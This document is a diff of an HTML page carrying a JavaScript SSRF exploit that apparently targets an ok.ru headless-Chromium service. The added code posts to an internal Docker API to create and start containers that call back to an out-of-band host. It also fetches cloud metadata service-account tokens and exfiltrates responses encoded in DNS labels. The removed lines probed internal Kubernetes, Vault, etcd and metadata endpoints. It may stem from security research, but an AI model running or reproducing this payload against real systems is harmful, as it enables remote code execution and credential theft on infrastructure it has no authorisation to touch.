@@ -4,22 +4,20 @@
 <body>
 <script>
 'use strict';
-// ok.ru Chromium SSRF — escalation probe v3
-// DNS-label encoding: timing + error type in label, no HTTP needed for exfil
+// ok.ru Chromium SSRF — probe v4
+// Goal: prove Docker API POST via no-cors (container create + start = OOB hit from container IP)
+
 const OOB = 'd9kjf7b6b8m9jk7s693gjsxj13ripi6b4.oast.pro';
 const T0 = Date.now();
 
 const clean = (s) => s.toLowerCase().replace(/[^a-z0-9-]/g, '-').replace(/-+/g, '-').replace(/^-|-$/g, '').substring(0, 60);
 
-// DNS-only exfil: data is encoded IN the label (no HTTP needed)
 const dnsOob = (label) => {
   const l = clean(label);
   new Image().src = `https://${l}.${OOB}/`;
-  // Also try HTTP in case it starts working
   fetch(`https://${l}.${OOB}/`, { mode: 'no-cors', signal: AbortSignal.timeout(3000) }).catch(() => {});
 };
 
-// Error code abbreviations: ab=AbortError/timeout, te=TypeError, ne=NetworkError
 const errCode = (e) => {
   if (!e) return 'unk';
   const n = e.name || '';
@@ -32,118 +30,90 @@ const errCode = (e) => {
   return n.substring(0, 4).toLowerCase();
 };
 
-// Probe + encode result in DNS label: labelPrefix-ok-{ms} or labelPrefix-err-{ec}-{ms}
-const probe = async (labelPrefix, url, timeoutMs = 5000) => {
+const probe = async (lp, url, ms = 5000) => {
   const t0 = Date.now();
   try {
-    const r = await fetch(url, { signal: AbortSignal.timeout(timeoutMs) });
+    const r = await fetch(url, { signal: AbortSignal.timeout(ms) });
     const body = await r.text();
-    const ms = Date.now() - t0;
-    // Success: encode status + first 8 chars of body (safe chars only)
-    const bodySnip = body.substring(0, 8).replace(/[^a-z0-9]/gi, '').toLowerCase().substring(0, 8);
-    dnsOob(`${labelPrefix}-ok-${r.status}-${ms}ms-${bodySnip}`);
-    // If we actually got a body, send it in chunks via DNS
+    const elapsed = Date.now() - t0;
+    const snip = body.substring(0, 8).replace(/[^a-z0-9]/gi, '').toLowerCase().substring(0, 8);
+    dnsOob(`${lp}-ok-${r.status}-${elapsed}ms-${snip}`);
     if (body.length > 0) {
       const hex = Array.from(new TextEncoder().encode(body.substring(0, 60)))
         .map(b => b.toString(16).padStart(2, '0')).join('');
-      const chunks = hex.match(/.{1,50}/g) || [];
-      chunks.forEach((chunk, i) => dnsOob(`${labelPrefix}-body${i}-${chunk}`));
+      (hex.match(/.{1,50}/g) || []).forEach((c, i) => dnsOob(`${lp}-b${i}-${c}`));
     }
-    return { ok: true, ms, status: r.status, body };
   } catch (e) {
-    const ms = Date.now() - t0;
-    const ec = errCode(e);
-    dnsOob(`${labelPrefix}-err-${ec}-${ms}ms`);
-    return { ok: false, ms, err: e };
+    dnsOob(`${lp}-err-${errCode(e)}-${Date.now()-t0}ms`);
   }
 };
 
-// Timing-only (no-cors) for when we just need TCP reachability
-const timingProbe = async (labelPrefix, url, timeoutMs = 3000) => {
+const ncProbe = async (lp, url, method = 'GET', body = null, ms = 5000) => {
   const t0 = Date.now();
+  const opts = { method, mode: 'no-cors', signal: AbortSignal.timeout(ms) };
+  if (body !== null) opts.body = body;
   try {
-    await fetch(url, { mode: 'no-cors', signal: AbortSignal.timeout(timeoutMs) });
-    const ms = Date.now() - t0;
-    dnsOob(`${labelPrefix}-sent-${ms}ms`);
-    return { ms, state: 'sent' };
+    await fetch(url, opts);
+    dnsOob(`${lp}-nc-ok-${Date.now()-t0}ms`);
   } catch (e) {
-    const ms = Date.now() - t0;
-    const ec = errCode(e);
-    dnsOob(`${labelPrefix}-terr-${ec}-${ms}ms`);
-    return { ms, state: ec };
+    dnsOob(`${lp}-nc-err-${errCode(e)}-${Date.now()-t0}ms`);
   }
 };
-
-// WebSocket: encode close code and error in DNS label
-const wsProbe = (labelPrefix, url) => new Promise(resolve => {
-  try {
-    const ws = new WebSocket(url);
-    ws.onopen   = () => dnsOob(`${labelPrefix}-wsopen`);
-    ws.onmessage = (e) => {
-      const snip = (e.data || '').substring(0, 20).replace(/[^a-z0-9]/gi, '').toLowerCase();
-      dnsOob(`${labelPrefix}-wsmsg-${snip}`);
-      ws.close();
-    };
-    ws.onerror  = () => dnsOob(`${labelPrefix}-wserr`);
-    ws.onclose  = (e) => {
-      dnsOob(`${labelPrefix}-wsclose-c${e.code}-${e.wasClean ? 'cl' : 'ab'}`);
-      resolve();
-    };
-    setTimeout(() => { try { ws.close(); } catch(_){} resolve(); }, 6000);
-  } catch (e) {
-    dnsOob(`${labelPrefix}-wsexc`);
-    resolve();
-  }
-});
 
 (async () => {
-  // ANNOUNCE
-  const ua = navigator.userAgent.substring(0, 60).replace(/[^a-z0-9. /]/gi, '').toLowerCase();
-  dnsOob(`exec-v3-${clean(ua).substring(0, 40)}`);
+  dnsOob(`exec-v4-${clean(navigator.userAgent.substring(0, 40))}`);
 
-  // ── DOCKER API (172.17.0.1:2375) ─────────────────────────────────────────
-  // /_ping first (quick confirm)
-  await probe('dp', 'http://172.17.0.1:2375/_ping', 5000);
-  // Full read of useful endpoints
-  await probe('dv', 'http://172.17.0.1:2375/version', 5000);
-  await probe('di', 'http://172.17.0.1:2375/info', 5000);
-  await probe('dc', 'http://172.17.0.1:2375/containers/json', 5000);
+  // A: no-cors vs cors GET /_ping — does no-cors behave differently re: PNA?
+  await ncProbe('dp-nc', 'http://172.17.0.1:2375/_ping', 'GET', null, 5000);
+  await probe('dp-c',   'http://172.17.0.1:2375/_ping', 5000);
 
-  // Alt bridge: timing only
-  await timingProbe('dalt-17218', 'http://172.18.0.1:2375/_ping', 2000);
-  await timingProbe('dalt-17216', 'http://172.16.0.1:2375/_ping', 2000);
+  // B: Docker POST — create container with busybox, run wget to OOB
+  // OOB hit from container IP (172.17.0.x) proves RCE — different IP than Chromium service
+  const createBody = JSON.stringify({
+    Image: 'busybox',
+    Cmd: ['wget', '-q', '-T', '5', `http://v4rce.${OOB}/`],
+    HostConfig: { NetworkMode: 'bridge' }
+  });
+  await ncProbe('dc-cr', 'http://172.17.0.1:2375/containers/create?name=ssrf-v4', 'POST', createBody, 5000);
+  await new Promise(r => setTimeout(r, 300));
+  await ncProbe('dc-st', 'http://172.17.0.1:2375/containers/ssrf-v4/start', 'POST', '', 5000);
 
-  // ── KUBERNETES API (10.96.0.1:8080) ──────────────────────────────────────
-  await probe('k-api',   'http://10.96.0.1:8080/api', 6000);
-  await probe('k-apiv1', 'http://10.96.0.1:8080/api/v1', 6000);
-  await probe('k-pods',  'http://10.96.0.1:8080/api/v1/pods', 6000);
-  await probe('k-ns',    'http://10.96.0.1:8080/api/v1/namespaces', 6000);
-  await probe('k-sec',   'http://10.96.0.1:8080/api/v1/secrets', 6000);
-  await probe('k-vers',  'http://10.96.0.1:8080/version', 6000);
-  await probe('k-hz',    'http://10.96.0.1:8080/healthz', 6000);
+  // Wait for container wget to fire (5s timeout in wget itself)
+  await new Promise(r => setTimeout(r, 6000));
+  dnsOob('dc-wait-done');
 
-  // K8s 6443 (TLS)
-  await probe('k6443', 'https://10.96.0.1:6443/api', 6000);
+  // Fallback: alpine
+  const createAlpine = JSON.stringify({
+    Image: 'alpine',
+    Cmd: ['wget', '-q', '-T', '5', `http://v4rce-al.${OOB}/`],
+    HostConfig: { NetworkMode: 'bridge' }
+  });
+  await ncProbe('dc-cr-al', 'http://172.17.0.1:2375/containers/create?name=ssrf-v4-al', 'POST', createAlpine, 5000);
+  await new Promise(r => setTimeout(r, 300));
+  await ncProbe('dc-st-al', 'http://172.17.0.1:2375/containers/ssrf-v4-al/start', 'POST', '', 5000);
+  await new Promise(r => setTimeout(r, 6000));
+  dnsOob('dc-al-wait-done');
 
-  // WebSocket watch endpoints
-  await wsProbe('kwspods', 'ws://10.96.0.1:8080/api/v1/pods?watch=true');
-  await wsProbe('kwsevts',  'ws://10.96.0.1:8080/api/v1/events?watch=true');
+  // C: YC IMDS with Metadata-Flavor header
+  const probeH = async (lp, url, headers, ms = 5000) => {
+    const t0 = Date.now();
+    try {
+      const r = await fetch(url, { headers, signal: AbortSignal.timeout(ms) });
+      const body = await r.text();
+      const snip = body.substring(0, 8).replace(/[^a-z0-9]/gi, '').toLowerCase().substring(0, 8);
+      dnsOob(`${lp}-ok-${r.status}-${Date.now()-t0}ms-${snip}`);
+      if (body.length > 0) {
+        const hex = Array.from(new TextEncoder().encode(body.substring(0, 60)))
+          .map(b => b.toString(16).padStart(2, '0')).join('');
+        (hex.match(/.{1,50}/g) || []).forEach((c, i) => dnsOob(`${lp}-b${i}-${c}`));
+      }
+    } catch (e) { dnsOob(`${lp}-err-${errCode(e)}-${Date.now()-t0}ms`); }
+  };
+  await probeH('yc-pid', 'http://169.254.169.254/computeMetadata/v1/project/project-id', { 'Metadata-Flavor': 'Google' });
+  await probeH('yc-iid', 'http://169.254.169.254/computeMetadata/v1/instance/id',         { 'Metadata-Flavor': 'Google' });
+  await probeH('yc-tok', 'http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token', { 'Metadata-Flavor': 'Google' });
 
-  // ── IMDS ─────────────────────────────────────────────────────────────────
-  await probe('imds-r',   'http://169.254.169.254/',                                          5000);
-  await probe('imds-m',   'http://169.254.169.254/latest/meta-data/',                         5000);
-  await probe('imds-iam', 'http://169.254.169.254/latest/meta-data/iam/security-credentials/',5000);
-  await probe('imds-tok', 'http://169.254.169.254/latest/api/token',                          5000);
-  await probe('imds-yc',  'http://169.254.169.254/computeMetadata/v1/project/project-id',     5000);
-
-  // ── INTERNAL SERVICES ────────────────────────────────────────────────────
-  await probe('csul',  'http://10.96.0.1:8500/v1/agent/self',         3000);
-  await probe('vlt',   'http://10.96.0.1:8200/v1/sys/health',         3000);
-  await probe('etcd',  'http://10.96.0.1:2379/health',                3000);
-  await probe('dmet',  'http://172.17.0.1:9323/metrics',              3000);
-
-  // DONE
-  dnsOob(`done-v3-${Date.now() - T0}ms`);
+  dnsOob(`done-v4-${Date.now()-T0}ms`);
 })();
 </script>
 </body>
